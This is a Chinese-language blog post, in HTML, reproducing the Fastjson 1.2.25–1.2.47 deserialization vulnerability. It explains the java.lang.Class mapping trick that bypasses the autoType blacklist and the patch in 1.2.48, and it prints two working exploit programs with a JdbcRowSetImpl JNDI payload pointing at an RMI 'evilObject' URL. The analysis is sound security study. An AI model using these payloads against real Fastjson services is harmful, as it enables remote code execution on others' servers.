@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>Fastjson<=1.2.47漏洞复现</h1>
+                    <h2 class="subheading">Fastjson<=1.2.47漏洞复现</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on April 10, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;这里继续跟进一下下一个版本的漏洞利用。</p>
+                
+                <h2 class="section-heading">影响版本</h2>
+
+                <p>1.2.25-1.2.32: </p>
+                
+                <p>&nbsp;&nbsp;&nbsp;未开启AutoTypeSupport时能成功利用</p>
+                
+                <p>1.2.33-1.2.47: </p>
+                
+                <p>&nbsp;&nbsp;&nbsp;无论是否开启AutoTypeSupport都能成功利用</p>
+                
+                
+                
+                
+                <h2 class="section-heading">1.2.25<=Fastjson<=1.2.32</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;因为没有开启AutoTypeSupport，所以就不会进入这个if黑白名单判断的逻辑，并且传入的是java.lang.class在下面也能绕过黑名单，重点还是看第二个键值解析。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/1-1.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/1-1.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;与前面的利用链不同，这里是在com.alibaba.fastjson.parser.DefaultJSONParser方法中调用MiscCodec类的deserialze方法。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/1-2.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/1-2.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;重点看一下deserialze方法，这里通过parse方法获取objVal，之后又赋值给了strVal。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/1-3.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/1-3.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;然后到了这个地方通过TypeUtils.loadClass方法加载strVal中的类。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/1-4.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/1-4.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;之后在这个方法中将strVal加入到mapping中。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/1-5.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/1-5.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;到了后面会从mapping中加载第二个键值，也就绕过了第一次加载的检测。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/1-6.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/1-6.jpg" alt="">
+              	</a>
+     	              	
+              	
+              	<h2 class="section-heading">EXP</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-keyword">import</span> com.alibaba.fastjson.<span class="hljs-type">JSON</span>;
+
+public class <span class="hljs-type">Fastjson6</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span>{
+        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{\n"</span> +
+                <span class="hljs-string">"    \"a\":{\n"</span> +
+                <span class="hljs-string">"        \"@type\":\"java.lang.Class\",\n"</span> +
+                <span class="hljs-string">"        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n"</span> +
+                <span class="hljs-string">"    },\n"</span> +
+                <span class="hljs-string">"    \"b\":{\n"</span> +
+                <span class="hljs-string">"        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n"</span> +
+                <span class="hljs-string">"        \"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\",\n"</span> +
+                <span class="hljs-string">"        \"autoCommit\":true\n"</span> +
+                <span class="hljs-string">"    }\n"</span> +
+                <span class="hljs-string">"}"</span>;
+        <span class="hljs-type">JSON</span>.parse(payload);
+    }
+}</code></pre>
+                	
+                	
+                	</div>
+              	
+              	
+              	
+              	<h2 class="section-heading">1.2.33<=Fastjson<=1.2.47</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;这里只对开启AutoTypeSupport的1.2.47版本做分析，解析第一个键值的过程与上面的差不多，一样利用MiscCodec类的deserialze方法将恶意类存放入Mapping中。
+                	主要的区别还是在第二个键值的解析上，因为开启了AutoTypeSupport，所以会进入黑白名单校验，这里来看一下怎么绕过的。</p>
+                	<p>&nbsp;&nbsp;&nbsp;这里都是hash比较难看，但根据前文或者变量名可以判断出因为开启了AutoTypeSupport，所以会先进行白名单判断，再进行黑名单校验。
+                	而第二个键值的解析自然是过不了白名单检验，并且会进入黑名单校验，com.sun.rowset.JdbcRowSetImpl肯定是过不了黑名单校验的。
+                	好在黑名单校验的if判断条件中是需要两个必须同时满足的条件，而第二个条件是不满足的，因为解析第一键值的时候会把第二个键值存入Mapping中。</p>
+                	<p>&nbsp;&nbsp;&nbsp;在1.2.25-1.2.32版本开启AutoTypeSupport利用失败的原因是，黑名单判断逻辑里面少了一个TypeUtils.getClassFromMapping(typeName) == null导致可以进入黑名单判断。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/2-1.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/2-1.jpg" alt="">
+              	</a>
+              	
+              	<h2 class="section-heading">补丁</h2>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;在1.2.48版本中这里多了一个缓存判断，并且缓存默认为false，这意味着无法向mapping中存入恶意类名来绕过黑名单判断。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-10/3-1.jpg">
+                	<img class="img-fluid" src="../img/2022-4-10/3-1.jpg" alt="">
+              	</a>
+              	
+              	
+              	
+              	
+              	
+              	
+              	
+              	
+              	<h2 class="section-heading">EXP</h2>
+              	
+              	<div>
+              		
+              		<pre class='hljs'><code><span class="hljs-keyword">import</span> com.alibaba.fastjson.<span class="hljs-type">JSON</span>;
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.<span class="hljs-type">ParserConfig</span>;
+
+public class <span class="hljs-type">Fastjson6</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span>{
+        <span class="hljs-type">ParserConfig</span>.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{\n"</span> +
+                <span class="hljs-string">"    \"a\":{\n"</span> +
+                <span class="hljs-string">"        \"@type\":\"java.lang.Class\",\n"</span> +
+                <span class="hljs-string">"        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n"</span> +
+                <span class="hljs-string">"    },\n"</span> +
+                <span class="hljs-string">"    \"b\":{\n"</span> +
+                <span class="hljs-string">"        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n"</span> +
+                <span class="hljs-string">"        \"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\",\n"</span> +
+                <span class="hljs-string">"        \"autoCommit\":true\n"</span> +
+                <span class="hljs-string">"    }\n"</span> +
+                <span class="hljs-string">"}"</span>;
+        <span class="hljs-type">JSON</span>.parse(payload);
+    }
+}</code></pre>
+              		
+              		
+              		</div>
+
+
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
